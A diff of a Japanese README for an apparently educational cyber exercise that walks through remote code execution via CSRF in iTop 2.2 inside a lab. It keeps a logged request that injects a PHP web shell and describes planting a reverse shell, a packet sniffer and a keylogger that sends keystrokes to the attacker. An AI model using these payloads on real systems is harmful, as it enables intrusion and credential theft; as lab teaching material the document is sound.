@@ -1,25 +1,12 @@
-# クロスサイトリクエストフォージェリ脆弱性を利用した標的型攻撃演習について
+# クロスサイトリクエストフォージェリ脆弱性攻撃演習について
 ## Motivation
-標的型攻撃は、海外ではAPT (Advanced Persistent Threat) と呼ばれるサイバー攻撃の手法の一つで、情報セキュリティ対策推進会議が定義した「高度サイバー攻撃」に含まれる。その手口は年々巧妙化・多様化し、目的を達成するまでは執拗にサイバー攻撃が繰り返される。
-
-標的型攻撃には5つの攻撃段階がある。
-
-攻撃段階 | 説明 |
---- | ---
-事前調査 | Targetとなる組織を攻撃するための情報収集
-初期潜入 | 標的型メールやUSB、ウェブサイト閲覧を通して不正プログラムの実行、脆弱性攻撃による公開サーバへの侵入
-攻撃基盤構築 | 侵入したPC内でバックドアを作成し、外部のC&Cサーバと通信を行い、新たウィルス等をダウンロードする
-システム調査 | 情報の存在箇所特定や情報の取得を行う
-攻撃最終目的の遂行 | 攻撃専用のウィルス等をダウンロードして、攻撃を遂行する
-
-標的型攻撃の攻撃手法を理解し、現実社会においてどのように発生するかを理解することは重要である。
+攻撃者 (Attacker) がクロスサイトリクエストフォージェリ（CSRF）の脆弱性を持つウェブサイト (Target) にユーザを誘導することにより、このサイトにアクセスしたユーザのブラウザ環境で不正スクリプトが実行される。CSRFによる攻撃や情報漏洩が現実社会においてどのように発生するかを理解することは重要である。
 
 ## 学習目標
-CyExcが提供する本演習では、標的型攻撃段階1から4を擬似的に再現し標的型攻撃の脅威を理解することを目とし、次の演習を行う。
-1. nmap、traceroute、netcatを使用し、Targetの調査
-2. RCE via CSRF in iTopを再現し、CSRFによるRemote Code Excution（RCE）を実施
-3. Reverse Shellを利用して、TCP snifferやKeyloggerプログラムをTargetウェブサーバに設置し、Attackerと通信を行う
-4. Target OSのファイアウォールログについて
+CyExcが提供する本演習では、CSRFの脆弱性やこれが利用された攻撃の手法や脅威の理解を目的とし、次の演習を行う。
+1. RCE via CSRF in iTopを再現し、CSRFによるRemote Code Excution（RCE）
+2. Reverse Shellを利用して、TCP snifferやKeyloggerプログラムを利用した情報収集
+3. Target OSのファイアウォールログについて
 
 TCP snifferやKeyloggerのコードは倫理の観点から、ここでの公開はしないこととする。
 
@@ -50,7 +37,7 @@ $ vagrant ssh attacker  <br>
 	ii.$ sudo docker-compose up --build  <br>
 
 ## シナリオ
-AttackerがiTop version 2.2の利用者に対し、不正なリクエストを含んだサイトアクセスを誘導したとする（標的型攻撃段階2）。本演習では、CSRF攻撃によるRCEの実行を再現する。AttackerからTargetにRCEを行い、Reverse ShellスクリプトをTargetウェブサーバに設置する（標的型攻撃段階3）。Reverse ShellスクリプトからTCP snifferやKeyloggerをTargetウェブサーバに設置し、HTTP情報やキーボード入力を監視する（標的型攻撃段階4）。
+AttackerがiTop version 2.2の利用者に対し、不正なリクエストを含んだサイトアクセスを誘導したとする。本演習では、CSRF攻撃によるRCEの実行を再現する。AttackerからTargetウェブサーバにRCEを行い、Reverse ShellスクリプトをTargetウェブサーバに設置する。Reverse ShellスクリプトからTCP snifferやKeyloggerをTargetウェブサーバに設置し、HTTP情報やキーボード入力を監視する。
 
 ## Steps
 1. ht&#8203;tp://target.cyexc-target:8000/にアクセスする。
@@ -153,48 +140,10 @@ Anywhere                   ALLOW OUT   Anywhere on eth1
 Anywhere (v6)              ALLOW OUT   Anywhere (v6) on eth1
 ```
 
-## 標的型攻撃段階1
-ここではTarget OSの情報収集を行う。
-
-* Target OSのポートスキャン
-
-```
-vagrant@attacker:~$ sudo nmap -O target.cyexc-target
-
-Starting Nmap 6.40 ( http://nmap.org ) at 2018-02-05 19:30 UTC
-Nmap scan report for target.cyexc-target (192.168.33.10)
-Host is up (0.00066s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-111/tcp  open  rpcbind
-8000/tcp open  http-alt
-MAC Address: 08:00:27:8F:41:70 (Cadmus Computer Systems)
-No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
-```
-
-* 経路確認
-
-```
-vagrant@attacker:~$ traceroute target.cyexc-target
-traceroute to target.cyexc-target (192.168.33.10), 30 hops max, 60 byte packets
- 1  target.cyexc-target (192.168.33.10)  0.377 ms  0.242 ms  0.181 ms
-```
-
-* 特定ポートの疎通確認
-
-```
-vagrant@attacker:~$ nc -v -w 1 192.168.33.10 -z 4444
-nc: connect to 192.168.33.10 port 4444 (tcp) failed: Connection refused
-```
-
-## 標的型攻撃段階2
-ここでは、AttackerはRCE via CSRF in iTopの脆弱性を含むHTMLを作成し、iTopのAdminアカウントユーザに対して、ht&#8203;tp://ww&#8203;w.attacker.cyexc-attacker:8081/login.htmlのアクセスを促すようなメールを送付する。
-
-### CSRF
+## CSRF
 CSRFはクロスサイトスクリプティング（XSS）と似ているウェブ脆弱性のひとつである。XSSは「動的ウェブサイト」の脆弱性でJavaScriptを利用した攻撃に対し、CSRFはウェブアプリケーションに対する、またはその脆弱性を利用したウェブサーバに対する攻撃である。CSRFはウェブサーバ上で不正なスクリプトを実行する。
 
-WEBサーバのログで事象を確認する。
+CSRFの事象をWEBサーバのログで確認する。
 
 * AttackerウェブサーバからTargetウェブサーバに不正なスクリプト含むHTTPリクエスト
 
@@ -213,7 +162,9 @@ POST /env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor HTTP/1.1.
 auth_user=admin&auth_pwd=1234&loginop=login&operation=save&prev_config=1&new_config=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29+die%28passthru%28%24_GET%5B%27cmd%27%5D%29%29%3B+%3F%3E
 ``
 
-## 標的型攻撃段階3
+## RCE
+RCEとは、AttackerがTargetマシンまたはTargetマシンのプロセスで任意のコードを実行することである。
+
 * RCEを利用してReverse ShellスクリプトをTargetウェブサーバにダウンロード
 
 ``
@@ -237,12 +188,13 @@ Attacker画面
 ＠[iTopコンテナプロキシ access.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/access.log) <br>
 ＠[iTopコンテナプロキシ error.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/error.log) <br>
 
-## 標的型攻撃段階4
+## Targetマシンの情報収集方法について
 Targetウェブサーバの情報を収集するため、TCP snifferプログラムとKeyloggerプログラムを設置する。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/rs.png" width=400 title="Screenshot6">
 
 ### TCP snifferプログラム
+スニファリングとは、LAN上を流れるパケットを盗聴することである。本演習では、HTTPプロトコル（TCP port80）を盗聴するプログラムを作成した。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/sniffer.png" height=270 title="Screenshot7">
 
@@ -295,7 +247,7 @@ Cache-Control: max-age=0
 ＠[Target OS ufw.log](https://github.com/CyExc/CyExc/blob/master/2017/ex4/logs/ufw.log)
 
 ### Keyloggerプログラム
-特定のHTMLに入力されたキーボード情報をAttackerに送信する。
+Keyloggerとは、利用者のキーボード入力情報を記録するツールのことである。本演習では、特定のHTMLに入力されたキーボード情報をAttackerに送信する。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex4/images/keylogger.png" height=270 title="Screenshot8">
 
